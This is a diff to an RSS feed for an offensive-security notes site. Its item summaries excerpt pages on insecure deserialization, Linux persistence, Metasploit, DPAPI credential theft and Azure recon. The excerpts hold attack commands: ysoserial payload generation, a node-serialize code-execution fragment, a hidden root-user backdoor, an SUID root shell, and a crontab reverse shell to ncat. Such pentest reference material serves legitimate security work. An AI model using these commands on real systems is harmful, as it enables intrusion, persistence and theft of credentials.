@@ -7,12 +7,50 @@
     <generator>Hugo -- gohugo.io</generator>
     <copyright>2023</copyright><atom:link href="https://www.grayhatfreelancing.com/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>.NET Insecure Deserialization</title>
+      <link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/dotnet/</link>
+      <pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/dotnet/</guid>
+      <description>.NET Serialization # Summary # Detection Tools Formatters XmlSerializer DataContractSerializer NetDataContractSerializer LosFormatter JSON.NET BinaryFormatter POP Gadgets References Detection # AAEAAD (Hex) = .NET deserialization BinaryFormatter FF01 (Hex) / /w (Base64) = .NET ViewState Example: AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u[...]0KPC9PYmpzPgs=
+Tools # pwntester/ysoserial.net - Deserialization payload generator for a variety of .NET formatters $ cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s $ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini $ .</description>
+    </item>
+    
+    <item>
+      <title>Insecure Deserialization</title>
+      <link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/</link>
+      <pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/</guid>
+      <description>Insecure Deserialization # Serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications. Deserialization is the reverse of that process &amp;ndash; taking data structured from some format, and rebuilding it into an object - OWASP Check the following sub-sections, located in other files :</description>
+    </item>
+    
+    <item>
+      <title>Node Insecure Deserialization</title>
+      <link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/node/</link>
+      <pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/node/</guid>
+      <description>Node Deserialization # Summary # Exploit node-serialize funcster References Exploit # In Node source code, look for: node-serialize serialize-to-js funcster node-serialize # An issue was discovered in the node-serialize package 0.0.4 for Node.js. Untrusted data passed into the unserialize() function can be exploited to achieve arbitrary code execution by passing a JavaScript Object with an Immediately Invoked Function Expression (IIFE).
+Generate a serialized payload var y = { rce : function(){ require(&amp;#39;child_process&amp;#39;).</description>
+    </item>
+    
+    <item>
+      <title>PHP Insecure Deserialization</title>
+      <link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/php/</link>
+      <pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/php/</guid>
+      <description>PHP Deserialization # PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.</description>
+    </item>
+    
+    <item>
       <title>Insecure Deserialization - Java</title>
       <link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/java/</link>
       <pubDate>Thu, 23 Mar 2023 00:00:00 +0000</pubDate>
       
       <guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/java/</guid>
-      <description>Java Deserialization # Detection # &amp;quot;AC ED 00 05&amp;quot; in Hex AC ED: STREAM_MAGIC. Specifies that this is a serialization protocol. 00 05: STREAM_VERSION. The serialization version. &amp;quot;rO0&amp;quot; in Base64 Content-type = &amp;quot;application/x-java-serialized-object&amp;quot; &amp;quot;H4sIAAAAAAAAAJ&amp;quot; in gzip(base64)
+      <description>Java Deserialization # Detection # &amp;quot;AC ED 00 05&amp;quot; in Hex AC ED: __STREAM_MAGIC__. Specifies that this is a serialization protocol. 00 05: __STREAM_VERSION__. The serialization version. &amp;quot;rO0&amp;quot; in Base64 Content-type = &amp;quot;application/x-java-serialized-object&amp;quot; &amp;quot;H4sIAAAAAAAAAJ&amp;quot; in gzip(base64)
 Tools # Ysoserial # frohoff/ysoserial : A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
 java -jar ysoserial.jar CommonsCollections1 calc.exe &amp;gt; commonpayload.bin java -jar ysoserial.jar Groovy1 calc.exe &amp;gt; groovypayload.bin java -jar ysoserial.</description>
     </item>
@@ -271,47 +309,6 @@ $ rpcclient -U &amp;#39;%&amp;#39; [target host] rpcclient $&amp;gt; querydominf
       
       <guid>https://www.grayhatfreelancing.com/docs/linux_persistence/</guid>
       <description>Linux - Persistence # Basic reverse shell # ncat --udp -lvp 4242 ncat --sctp -lvp 4242 ncat --tcp -lvp 4242 Add a root user # sudo useradd -ou 0 -g 0 john sudo passwd john echo &amp;#34;linuxpassword&amp;#34; | passwd --stdin john Suid Binary # TMPDIR2=&amp;#34;/var/tmp&amp;#34; echo &amp;#39;int main(void){setresuid(0, 0, 0);system(&amp;#34;/bin/sh&amp;#34;);}&amp;#39; &amp;gt; $TMPDIR2/croissant.c gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2&amp;gt;/dev/null rm $TMPDIR2/croissant.c chown root:root $TMPDIR2/croissant chmod 4777 $TMPDIR2/croissant Crontab - Reverse shell # (crontab -l ; echo &amp;#34;@reboot sleep 200 &amp;amp;&amp;amp; ncat 192.</description>
-    </item>
-    
-    <item>
-      <title>Linux - Privilege Escalation</title>
-      <link>https://www.grayhatfreelancing.com/docs/linux_privilege_escalation/</link>
-      <pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/linux_privilege_escalation/</guid>
-      <description>Linux - Privilege Escalation # Tools # There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escelation vectors. Here are a few:
-LinPEAS - Linux Privilege Escalation Awesome Script
-wget &amp;#34;https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh&amp;#34; -O linpeas.sh curl &amp;#34;https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh&amp;#34; -o linpeas.sh ./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete. ./linpeas.sh -s #superfast &amp;amp; stealth - This will bypass some time consuming checks.</description>
-    </item>
-    
-    <item>
-      <title>Metasploit</title>
-      <link>https://www.grayhatfreelancing.com/docs/metasploit_cheatsheet/</link>
-      <pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/metasploit_cheatsheet/</guid>
-      <description>Metasploit # Installation # curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall &amp;amp;&amp;amp; chmod 755 msfinstall &amp;amp;&amp;amp; ./msfinstall or docker
-sudo docker run --rm -it -p 443:443 -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit Sessions # CTRL+Z -&amp;gt; Session in Background sessions -&amp;gt; List sessions sessions -i session_number -&amp;gt; Interact with Session with id sessions -u session_number -&amp;gt; Upgrade session to a meterpreter sessions -u session_number LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false-&amp;gt; Upgrade session to a meterpreter sessions -c cmd -&amp;gt; Execute a command on several sessions sessions -i 10-20 -c &amp;#34;id&amp;#34; -&amp;gt; Execute a command on several sessions Background handler # ExitOnSession : the handler will not exit if the meterpreter dies.</description>
-    </item>
-    
-    <item>
-      <title>Microsoft Window&#39;s Data Protection API</title>
-      <link>https://www.grayhatfreelancing.com/docs/windows_dpapi/</link>
-      <pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/windows_dpapi/</guid>
-      <description>Windows - DPAPI # On Windows, credentials saved in the Windows Credentials Manager are encrypted using Microsoft&amp;rsquo;s Data Protection API and stored as &amp;ldquo;blob&amp;rdquo; files in user AppData folder.
-Summary # Data Protection API List Credential Files Mimikatz - Credential Manager &amp;amp; DPAPI Hekatomb - Steal all credentials on domain DonPAPI - Dumping DPAPI credz remotely Data Protection API # Outside of a domain: the user&amp;rsquo;s password hash is used to encrypt these &amp;ldquo;blobs&amp;rdquo;.</description>
-    </item>
-    
-    <item>
-      <title>Microsoft&#39;s Azure Cloud</title>
-      <link>https://www.grayhatfreelancing.com/docs/microsoft_azure_cloud/</link>
-      <pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://www.grayhatfreelancing.com/docs/microsoft_azure_cloud/</guid>
-      <description>Cloud - Azure # Azure Recon Tools # ROADTool - The Azure AD exploration framework.
-pipenv shell roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLIENT] [--as-app] [--device-code] [--access-token ACCESS_TOKEN] [--refresh-token REFRESH_TOKEN] [-f TOKENFILE] [--tokens-stdout] roadrecon gather [-h] [-d DATABASE] [-f TOKENFILE] [--tokens-stdin] [--mfa] roadrecon auth -u test@&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com -p &amp;lt;PASSWORD&amp;gt; roadrecon gather roadrecon gui Azure/StormSpotter - Azure Red Team tool for graphing Azure and Azure Active Directory objects</description>
     </item>
     
   </channel>
